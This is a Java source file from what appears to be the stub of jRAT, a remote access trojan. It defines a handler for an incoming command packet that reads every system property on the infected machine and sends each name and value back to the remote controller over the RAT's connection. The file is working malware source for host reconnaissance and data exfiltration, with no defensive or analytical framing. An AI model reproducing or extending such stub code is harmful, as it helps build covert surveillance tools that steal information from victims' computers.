package su.jrat.stub.packets.incoming;

import java.util.Set;

import su.jrat.stub.Connection;
import su.jrat.stub.packets.outgoing.Packet32SystemProperties;


public class Packet90SystemProperties extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			Connection.addToSendQueue(new Packet32SystemProperties(str.toString(), System.getProperty(str.toString())));
		}
	}

}
